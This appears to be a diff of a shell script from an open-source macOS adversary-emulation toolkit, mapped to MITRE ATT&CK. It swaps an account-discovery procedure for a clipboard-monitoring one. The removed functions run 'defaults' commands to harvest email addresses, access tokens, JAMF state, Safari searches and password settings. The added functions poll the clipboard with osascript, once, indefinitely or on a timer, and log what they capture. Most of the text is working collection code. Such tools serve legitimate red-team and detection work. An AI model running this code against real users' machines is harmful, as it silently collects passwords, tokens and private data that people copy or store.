@@ -1,14 +1,14 @@
 #!/bin/sh
 # POSIX-compliant
-# Procedure Name: find_account_defaults
-# Tactic: Discovery
-# Technique: T1087.001
-# GUID: 2488a056-5b6d-4a3a-b9d2-782019190eb8
-# Intent: Find account information and user data using defaults read commands to search application preferences and system settings
+# Procedure Name: clipboard_monitoring
+# Tactic: Collection
+# Technique: T1115
+# GUID: 22a27175-bc55-4ff0-86a2-48d9e806c711
+# Intent: Monitor and collect sensitive clipboard data using osascript over defined time periods
 # Author: @darmado | https://x.com/darmad0
-# created: 2025-01-27
+# created: 2025-01-02
 # Updated: 2025-06-03
-# Version: 1.0.2
+# Version: 1.0.3
 # License: Apache 2.0
 
 # Core function Info:
@@ -19,8 +19,8 @@
 #------------------------------------------------------------------------------
 NAME="" 
 # MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1087.001" #replace with you coresponding ttp_id
+TACTIC="Collection" #replace with you coresponding tactic
+TTP_ID="T1115" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -92,18 +92,23 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-EMAIL_SEARCH=false
-ACCOUNT_SEARCH=false
-APP_DATA=false
-ALL=false
+SINGLE_CAPTURE=false
+MONITOR_CONTINUOUS=false
+TIMED_CAPTURE=false
+INPUT_DURATION=""
+DURATION=false
+INPUT_INTERVAL=""
+INTERVAL=false
 
-CMD_DEFAULTS="defaults"
+DEFAULT_DURATION="60"
+DEFAULT_INTERVAL="10"
+OUTPUT_FILE="/tmp/clipdata.txt"
 
 # Project root path (set by build system)
 PROJECT_ROOT="/Users/darmado/tools/opensource/attack-macOS"  # Set by build system to project root directory
 
 # Procedure Information (set by build system)
-PROCEDURE_NAME="find_account_defaults"  # Set by build system from YAML procedure_name field
+PROCEDURE_NAME="clipboard_monitoring"  # Set by build system from YAML procedure_name field
 
 # Function execution tracking
 FUNCTION_LANG=""  # Ued by log_output at execution time
@@ -607,18 +612,37 @@ core_parse_args() {
                 DEBUG=true
                 ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
-        --email-search)
-            EMAIL_SEARCH=true
+        --single-capture)
+            SINGLE_CAPTURE=true
             ;;
-        --account-search)
-            ACCOUNT_SEARCH=true
+        --monitor-continuous)
+            MONITOR_CONTINUOUS=true
             ;;
-        --app-data)
-            APP_DATA=true
+        --timed-capture)
+            TIMED_CAPTURE=true
             ;;
-        --all)
-            ALL=true
-            ;;
+        --duration)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_DURATION="$2"
+                DURATION=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --interval)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_INTERVAL="$2"
+                INTERVAL=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
             *)
                 # Collect unknown arguments for error reporting
                 if [ -z "$UNKNOWN_ARGS" ]; then
@@ -657,10 +681,11 @@ HELP:
   -d, --debug                   Enable debug output (includes verbose output)
 
 SCRIPT:
-  --email-search                   Search for email addresses in defaults
-  --account-search                 Search for user accounts and device IDs
-  --app-data                       Search application preferences for user data
-  --all                            Run all account discovery searches
+  --single-capture                 Capture current clipboard contents once
+  --monitor-continuous             Monitor clipboard contents continuously
+  --timed-capture                  Capture clipboard at specified intervals
+  --duration NUMBER                Duration to monitor clipboard (in seconds)
+  --interval NUMBER                Interval between captures (in seconds)
 
 Output Options:
   --format TYPE                 
@@ -2004,6 +2029,9 @@ raw_output=""
 # Set global function language for this procedure
 FUNCTION_LANG="shell"
 
+# Process input arguments
+process_input_arguments
+
 # Helper function to execute procedure functions
 execute_function() {
     local func_name="$1"
@@ -2011,40 +2039,43 @@ execute_function() {
     $func_name
 }
 
-# Execute functions for --email-search
-if [ "$EMAIL_SEARCH" = true ]; then
-    core_debug_print "Executing functions for --email-search"
-    result=$(execute_function find_email_addresses)
+# Execute functions for --single-capture
+if [ "$SINGLE_CAPTURE" = true ]; then
+    core_debug_print "Executing functions for --single-capture"
+    result=$(execute_function single_clipboard_capture)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --account-search
-if [ "$ACCOUNT_SEARCH" = true ]; then
-    core_debug_print "Executing functions for --account-search"
-    result=$(execute_function find_user_accounts)
+# Execute functions for --monitor-continuous
+if [ "$MONITOR_CONTINUOUS" = true ]; then
+    core_debug_print "Executing functions for --monitor-continuous"
+    result=$(execute_function monitor_clipboard)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --app-data
-if [ "$APP_DATA" = true ]; then
-    core_debug_print "Executing functions for --app-data"
-    result=$(execute_function find_app_user_data)
+# Execute functions for --timed-capture
+if [ "$TIMED_CAPTURE" = true ]; then
+    core_debug_print "Executing functions for --timed-capture"
+    result=$(execute_function timed_clipboard_capture)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --all
-if [ "$ALL" = true ]; then
-    core_debug_print "Executing functions for --all"
-    result=$(execute_function find_email_addresses)
+# Execute functions for --duration
+if [ "$DURATION" = true ]; then
+    core_debug_print "Executing functions for --duration"
+    result=$(execute_function timed_clipboard_capture)
     raw_output="${raw_output}${result}"
-    result=$(execute_function find_user_accounts)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function find_app_user_data)
+fi
+
+# Execute functions for --interval
+if [ "$INTERVAL" = true ]; then
+    core_debug_print "Executing functions for --interval"
+    result=$(execute_function timed_clipboard_capture)
     raw_output="${raw_output}${result}"
 fi
 
 # Set procedure name for processing
-procedure="find_account_defaults"
+procedure="clipboard_monitoring"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2208,141 +2239,123 @@ core_generate_encryption_key() {
 
 # Generate job ID now that core functions are defined
 
+# Input processing and type conversion
+process_input_arguments() {
+    # Process and validate input arguments based on their types
+    
+    # Process --duration argument
+    if [ -n "${INPUT_DURATION}" ]; then
+        # Validate integer input
+        if ! echo "${INPUT_DURATION}" | grep -qE '^[0-9]+$'; then
+            echo "Error: --duration requires a valid integer, got: ${INPUT_DURATION}" >&2
+            exit 1
+        fi
+        DURATION_ARG="${INPUT_DURATION}"
+    fi
+    
+    # Process --interval argument
+    if [ -n "${INPUT_INTERVAL}" ]; then
+        # Validate integer input
+        if ! echo "${INPUT_INTERVAL}" | grep -qE '^[0-9]+$'; then
+            echo "Error: --interval requires a valid integer, got: ${INPUT_INTERVAL}" >&2
+            exit 1
+        fi
+        INTERVAL_ARG="${INPUT_INTERVAL}"
+    fi
+}
 
 
-# Function: find_email_addresses
+# Function: single_clipboard_capture
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-find_email_addresses() {
-    $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
+single_clipboard_capture() {
+    $CMD_PRINTF "CLIPBOARD_CAPTURE|SINGLE|Capturing current clipboard content\n"
     
-    # Find email addresses
-    local email_result
-    email_result=$($CMD_DEFAULTS find EmailAddress 2>/dev/null)
-    if [ -n "$email_result" ]; then
-        $CMD_PRINTF "EMAIL|defaults find EmailAddress|%s\n" "$email_result"
-    fi
+    # Capture current clipboard using osascript
+    local clipboard_data
+    clipboard_data=$(osascript -e 'return (the clipboard)' 2>/dev/null)
     
-    # Find owner email addresses
-    local owner_result
-    owner_result=$($CMD_DEFAULTS find OwnerEmailAddress 2>/dev/null)
-    if [ -n "$owner_result" ]; then
-        $CMD_PRINTF "OWNER_EMAIL|defaults find OwnerEmailAddress|%s\n" "$owner_result"
-    fi
-    
-    # Grammarly email data
-    local grammarly_result
-    grammarly_result=$($CMD_DEFAULTS read com.grammarly.ProjectLlama 2>/dev/null)
-    if [ -n "$grammarly_result" ]; then
-        $CMD_PRINTF "GRAMMARLY_DATA|defaults read com.grammarly.ProjectLlama|%s\n" "$grammarly_result"
+    if [ $? -eq 0 ] && [ -n "$clipboard_data" ]; then
+        local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+        $CMD_PRINTF "CLIPBOARD_DATA|%s|%s\n" "$timestamp" "$clipboard_data"
+    else
+        $CMD_PRINTF "ERROR|Failed to capture clipboard - may be empty or permission denied\n"
     fi
     
     return 0
 }
 
 
-# Function: find_user_accounts
+# Function: monitor_clipboard
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-find_user_accounts() {
-    $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
+monitor_clipboard() {
+    $CMD_PRINTF "CLIPBOARD_MONITOR|CONTINUOUS|Starting continuous clipboard monitoring\n"
     
-    # Find user accounts
-    local account_result
-    account_result=$($CMD_DEFAULTS find userAccount 2>/dev/null)
-    if [ -n "$account_result" ]; then
-        $CMD_PRINTF "USER_ACCOUNT|defaults find userAccount|%s\n" "$account_result"
-    fi
+    local previous_content=""
+    local iteration=0
     
-    # Find device identifiers
-    local device_result
-    device_result=$($CMD_DEFAULTS find DeviceIdentifier 2>/dev/null)
-    if [ -n "$device_result" ]; then
-        $CMD_PRINTF "DEVICE_ID|defaults find DeviceIdentifier|%s\n" "$device_result"
-    fi
-    
-    # Find access tokens
-    local token_result
-    token_result=$($CMD_DEFAULTS find access_token 2>/dev/null | sed 's/\\\\//g')
-    if [ -n "$token_result" ]; then
-        $CMD_PRINTF "ACCESS_TOKEN|defaults find access_token|%s\n" "$token_result"
-    fi
-    
-    # JAMF state
-    local jamf_result
-    jamf_result=$($CMD_DEFAULTS read com.jamf.connect.state 2>/dev/null)
-    if [ -n "$jamf_result" ]; then
-        $CMD_PRINTF "JAMF_STATE|defaults read com.jamf.connect.state|%s\n" "$jamf_result"
-    fi
+    # Monitor clipboard indefinitely until interrupted
+    while true; do
+        local current_content
+        current_content=$(osascript -e 'return (the clipboard)' 2>/dev/null)
+        
+        if [ $? -eq 0 ] && [ -n "$current_content" ] && [ "$current_content" != "$previous_content" ]; then
+            local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+            $CMD_PRINTF "CLIPBOARD_CHANGE|%s|%s\n" "$timestamp" "$current_content"
+            previous_content="$current_content"
+        fi
+        
+        iteration=$((iteration + 1))
+        if [ $((iteration % 30)) -eq 0 ]; then
+            $CMD_PRINTF "CLIPBOARD_STATUS|MONITORING|Iteration %d completed\n" "$iteration"
+        fi
+        
+        sleep 2
+    done
     
     return 0
 }
 
 
-# Function: find_app_user_data
+# Function: timed_clipboard_capture
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-find_app_user_data() {
-    $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
+timed_clipboard_capture() {
+    local duration="${DURATION_ARG:-$DEFAULT_DURATION}"
+    local interval="${INTERVAL_ARG:-$DEFAULT_INTERVAL}"
     
-    # Safari data
-    local safari_searches
-    safari_searches=$($CMD_DEFAULTS read com.apple.Safari RecentWebSearches 2>/dev/null)
-    if [ -n "$safari_searches" ]; then
-        $CMD_PRINTF "SAFARI_SEARCHES|defaults read com.apple.Safari RecentWebSearches|%s\n" "$safari_searches"
-    fi
+    $CMD_PRINTF "CLIPBOARD_TIMED|START|Monitoring for %s seconds at %s second intervals\n" "$duration" "$interval"
     
-    # Password settings
-    local password_settings
-    password_settings=$($CMD_DEFAULTS read com.apple.Passwords-Settings.extension 2>/dev/null)
-    if [ -n "$password_settings" ]; then
-        $CMD_PRINTF "PASSWORD_SETTINGS|defaults read com.apple.Passwords-Settings.extension|%s\n" "$password_settings"
-    fi
+    local end_time=$(($(date +%s) + duration))
+    local capture_count=0
     
-    # Microsoft To-Do
-    local todo_result
-    todo_result=$($CMD_DEFAULTS read com.microsoft.to-do-mac 2>/dev/null)
-    if [ -n "$todo_result" ]; then
-        $CMD_PRINTF "TODO_DATA|defaults read com.microsoft.to-do-mac|%s\n" "$todo_result"
-    fi
+    while [ $(date +%s) -lt $end_time ]; do
+        local clipboard_data
+        clipboard_data=$(osascript -e 'return (the clipboard)' 2>/dev/null)
+        
+        if [ $? -eq 0 ] && [ -n "$clipboard_data" ]; then
+            local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+            capture_count=$((capture_count + 1))
+            $CMD_PRINTF "CLIPBOARD_CAPTURE|%s|Capture %d: %s\n" "$timestamp" "$capture_count" "$clipboard_data"
+        else
+            local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+            $CMD_PRINTF "CLIPBOARD_EMPTY|%s|No clipboard content\n" "$timestamp"
+        fi
+        
+        sleep "$interval"
+    done
     
-    # CapCut data
-    local capcut_result
-    capcut_result=$($CMD_DEFAULTS read com.lemon.lvoverseas 2>/dev/null)
-    if [ -n "$capcut_result" ]; then
-        $CMD_PRINTF "CAPCUT_DATA|defaults read com.lemon.lvoverseas|%s\n" "$capcut_result"
-    fi
-    
-    # Google Drive settings
-    local gdrive_result
-    gdrive_result=$($CMD_DEFAULTS read com.google.drivefs.settings 2>/dev/null)
-    if [ -n "$gdrive_result" ]; then
-        $CMD_PRINTF "GDRIVE_SETTINGS|defaults read com.google.drivefs.settings|%s\n" "$gdrive_result"
-    fi
-    
-    # Mail settings
-    local mail_result
-    mail_result=$($CMD_DEFAULTS read com.apple.mail 2>/dev/null)
-    if [ -n "$mail_result" ]; then
-        $CMD_PRINTF "MAIL_SETTINGS|defaults read com.apple.mail|%s\n" "$mail_result"
-    fi
-    
-    # Notification Center preferences
-    local ncprefs_result
-    ncprefs_result=$($CMD_DEFAULTS read com.apple.ncprefs 2>/dev/null)
-    if [ -n "$ncprefs_result" ]; then
-        $CMD_PRINTF "NOTIFICATION_PREFS|defaults read com.apple.ncprefs|%s\n" "$ncprefs_result"
-    fi
-    
+    $CMD_PRINTF "CLIPBOARD_COMPLETE|FINISHED|Captured %d clipboard entries over %s seconds\n" "$capture_count" "$duration"
     return 0
 }
 
